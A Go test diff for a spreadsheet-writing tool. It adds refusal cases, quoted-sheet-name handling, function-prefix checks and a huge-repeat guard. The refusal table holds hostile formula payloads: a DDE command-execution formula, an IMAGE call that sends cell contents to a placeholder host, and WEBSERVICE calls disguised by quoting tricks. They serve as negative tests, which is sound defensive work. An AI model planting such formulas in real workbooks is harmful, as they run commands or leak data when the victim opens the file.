@@ -6,6 +6,7 @@ import (
 	"context"
 	"fmt"
 	"io"
+	"math"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -165,6 +166,10 @@ func TestWriteRefusals(t *testing.T) {
 		{"M1", [][]any{{"=CALL(\"k\",\"f\",\"J\")"}}, "external links"},
 		{"M1", [][]any{{"=REGISTER.ID(\"k\",\"f\")"}}, "external links"},
 		{"M1", [][]any{{"=cmd|'/C calc'!A0"}}, "external links"},
+		{"M1", [][]any{{"=IMAGE(\"https://x.test/?\"&A1)"}}, "external links"},
+		{"M1", [][]any{{"='a\"b'!A1&WEBSERVICE(\"x\")&\"c\""}}, "external links"},
+		{"M1", [][]any{{"=\"it''s\"&WEBSERVICE(\"x\")&\"'\""}}, "external links"},
+		{"M1", [][]any{{"=\"say \"\"hi\"\"\"&WEBSERVICE(A1)"}}, "external links"},
 		{"M1", [][]any{{"=SUM(1)+MAP(A1:A3,LAMBDA(x,x))"}}, "MAP is a dynamic-array, LAMBDA"},
 		{"M1", [][]any{{"=GROUPBY(A1:A3,B1:B3,SUM)"}}, "GROUPBY is a dynamic-array"},
 		{"M1", [][]any{{"=REGEXTEST(A1,\"a\")"}}, "REGEXTEST is a dynamic-array"},
@@ -229,6 +234,32 @@ func TestWriteFutureFunctions(t *testing.T) {
 	}
 	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E3", Rows: [][]any{{"=HYPERLINK(\"https://x.test\",\"site\")"}}}); err != nil {
 		t.Fatalf("hyperlink: %v", err)
+	}
+	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E4", Rows: [][]any{{"=SUM('Q1|Q2'!A1)", "='IFS (old)'!A1+IFS(TRUE,1)"}}}); err != nil {
+		t.Fatalf("quoted sheet names: %v", err)
+	}
+	f = reopen(t, fs, "book.xlsx")
+	if fl, _ := f.GetCellFormula("Data", "F4"); fl != "'IFS (old)'!A1+_xlfn.IFS(TRUE,1)" {
+		t.Fatalf("F4 formula = %q", fl)
+	}
+}
+
+func TestFormulaPrefixesIntlAndCeiling(t *testing.T) {
+	fl, err := formula("=NETWORKDAYS.INTL(A1,A2)+workday.intl(A1,1)+ISO.CEILING(1)+ECMA.CEILING(1,1)")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if want := "_xlfn.NETWORKDAYS.INTL(A1,A2)+_xlfn.WORKDAY.INTL(A1,1)+_xlfn.ISO.CEILING(1)+_xlfn.ECMA.CEILING(1,1)"; fl != want {
+		t.Fatalf("formula = %q, want %q", fl, want)
+	}
+}
+
+func TestWriteRefusesHugeRepeat(t *testing.T) {
+	fs, _ := newFSStore(t)
+	buildBook(t, fs, "book.xlsx")
+	_, err := writeTool(threadCtx(fs), writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E2", Rows: [][]any{{1.0}}, Repeat: math.MaxUint64})
+	if err == nil || !strings.Contains(err.Error(), "repeat") {
+		t.Fatalf("err = %v", err)
 	}
 }
 
@@ -435,12 +466,5 @@ func TestExcelFixtureKeptByWrites(t *testing.T) {
 	}
 	if panes.Freeze {
 		t.Fatalf("panes changed: %+v", panes)
-	}
-	res, err := checkTool(ctx, checkArg{Path: "excel.xlsx"})
-	if err != nil {
-		t.Fatal(err)
-	}
-	if len(res.Uncalculated) != 1 || len(res.Errors) != 0 {
-		t.Fatalf("check = %+v", res)
 	}
 }
